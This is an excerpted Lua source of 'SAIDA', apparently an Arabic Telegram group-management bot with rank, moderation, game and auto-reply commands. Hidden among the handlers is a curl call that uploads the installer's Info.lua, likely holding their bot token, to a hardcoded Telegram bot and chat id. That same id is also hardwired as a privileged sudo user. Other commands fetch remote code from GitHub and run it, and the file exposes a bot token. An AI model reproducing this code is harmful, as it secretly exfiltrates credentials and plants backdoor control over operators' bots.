...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MADISON11100/SAIDA/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1751679358,1208165035}   
...
if tonumber(user_id) == tonumber(1757895188) then  
var = true 
elseif tonumber(user_id) == tonumber(1751679358) then
var = true  
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'الصعايده'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
local curl = 'curl "'..'https://api.telegram.org/bot1706737466:AAG8CRj1VGRUinWWPnm8WEIGUHbl8j64KMY/sendDocument'..'" -F "chat_id='.. 1751679358 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
{'ضع كليشه الصعايدهت','حذف كليشه الصعايدهت'},
{'اذاعه ','اذاعه خاص '},
...
database:setex(bot_id..'SAIDAt:Time'..msg.sender_user_id_,300,true)
return false
end
...
if text and database:get(bot_id..'SAIDAt:Bots') then
if text == 'الغاء' or text == 'الغاء' then   
send(msg.chat_id_, msg.id_,'  ✯  الغاء حفظ كليشه الصعايدهت')
database:del(bot_id..'SAIDAt:Bots') 
return false
end
database:set(bot_id.."SAIDAt:Bot",text)  
send(msg.chat_id_, msg.id_,'  ✯  تم حفظ كليشه الصعايدهت')
database:del(bot_id..'SAIDAt:Bots') 
return false
end
if text == 'ضع كليشه الصعايدهت' and DevSoFi(msg) then 
database:set(bot_id..'SAIDAt:Bots',true) 
send(msg.chat_id_, msg.id_,'  ✯  ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه الصعايدهت' and DevSoFi(msg) then 
database:del(bot_id..'SAIDAt:Bot') 
send(msg.chat_id_, msg.id_,'  ✯  تم حذف كليشه الصعايدهت')
end
...
os.execute('wget https://raw.githubusercontent.com/MADISON11100/SAIDA/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' ✯  تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'  ✯  اصدار سورس الصعايده { s: 6.7}')
end
...
{{text = 'قناه السورس️️', url="t.me/Sadauam"}}, 
} 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'بًـوٌتٌ آلَتٌـوٌصّـلَ  ☑ ➘', url="t.me/J_a_b_w_a_bot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
function SAIDAt_function(extra, result, success)
if result.id_ then
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, SAIDAt_function, nil)
return false 
end
...
send(msg.chat_id_,0,"  ✯  العضو : {["..data.first_name_.."](T.ME/Sadauam)}\n  ✯  ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "  ✯  عذرا ⇎ {["..data.first_name_.."](T.ME/Sadauam)}\n  ✯  عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if text == '/SAIDAt' and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'الصعايده' then
local Text = [[
✪WELCOM IN SOURCE SAIDA✪
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Vbaajaj/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
local Text = [[
✭اهلا بيك في سورس الصعايده لو عايز بوت بكل حقوقك ع السورس تواصل معي✭
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text =  ⌯｟JABWA✯｠⌯ ,url="t.me/J_a_b_w_a"}},
...
if text == 'المبرمج' or text == 'جوبا' or text == 'صاحب السورس' then
local Text = [[
المبرمج للتواصل
]]
keyboard = {} 
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Vbaajaj/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'جوبا'  then
local Text = [[
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '❲JUBA⒒❳',url="t.me/J_a_b_w_a"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Vbaajaj/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'المطور البروفيسير'  then
local Text = [[
المطور البروفيسير لو حابب تتواصل معاهه
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local Text = [[
مبرمج السورس لتواصل مع اتبع الزر الي في الاسفل 🙁❤️
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'GABWA',url="t.me/J_a_b_w_a"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Vbaajaj/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس الصعايده ؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس الصعايده ؟ ", 
"كم مره حبيت؟ ", 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس ', url="t.me/Sadauam"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'تواصل السورس ', url="t.me/J_a_b_w_a_bot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'العاب الصعايده' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ✯ اهلا في قائمه الالعاب المتطوره سورس الصعايده  ✯ 
...
{{text = 'تشابه', url="https://t.me/gamee?game=DiamondRows"},{text = 'كره القدم', url="https://t.me/gamee?game=FootballSAIDA"}}, 
...
elseif text == 'قفل الصعايدهرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  ✯  بواسطه ⇎ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'textchuser')..') \n  ✯  تـم قفـل الصعايدهرسيه ')
end,nil)   
...
elseif text == 'فتح الصعايدهرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'  ✯  بواسطه ⇎ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'textchuser')..') \n  ✯  تـم فـتح الصعايدهرسيه ')
end,nil)   
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, SAIDAt_function, nil)
return false
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/MADISON11100/SAIDA/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n  ✯  اهلا بك في متجر ملفات الصعايده\n  ✯  ملفات السورس ↓\n•═════•| ✯SAIDA✯ |•═════•\n\n"
...
local json_file, res = https.request("https://raw.githubusercontent.com/MADISON11100/SAIDA/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_,"  ✯  عذرا الملف لايدعم سورس الصعايده \n") 
end
return false
end
...
if text == ("مسح قائمه الصعايده") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n  ✯  تم مسح قائمه الصعايده')
return false
end

if text == 'قائمه الصعايده' and Sudo(msg) then
...
if #list == 0 then
t = "  ✯  لا يوجد احد في قائمه الصعايده"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع الصعايده") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع الصعايده @(.*)$") and Sudo(msg) then
local username = text:match("^رفع الصعايده @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع الصعايده (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع الصعايده (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل الصعايده") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل الصعايده @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل الصعايده @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل الصعايده (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل الصعايده (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, SAIDAt_function, nil)
return false
end
if text and text:match("^كتم (%d+)$") and Mod(msg) then
...
keyboard.inline_keyboard = {
{{text = '❲'..result.first_name_..'❳',url="t.me/"..result.username_}},
{{text = 'ˋˏNˎˊˋˏAˎˊˋˏSˎˊˋˏAˎˊ', url="t.me/ch_nasa"}}, 
}
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..result.username_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'الصعايده')
local DRAGON_Msg = {
...
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل الكل @(.*)$")}, SAIDAt_function, nil)
end
...
end --الكود حصري سورس الصعايده يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'الصعايده').." غادر" or text == 'غادر' then  
...
if text == 'بوت' then
Namebot = (database:get(bot_id..'Name:Bot') or 'الصعايده')
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/Sadauam)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/Sadauam)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/Sadauam)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/Sadauam)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/Sadauam)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/Sadauam)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/Sadauam)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/Sadauam)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/Sadauam)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/Sadauam)') 
return false
end
...
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/Sadauam)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/Sadauam)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/Sadauam)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/Sadauam)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/Sadauam)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/Sadauam)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/Sadauam)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/Sadauam)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/Sadauam)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/Sadauam)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/Sadauam)') 
return false
end
end
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'الصعايده')
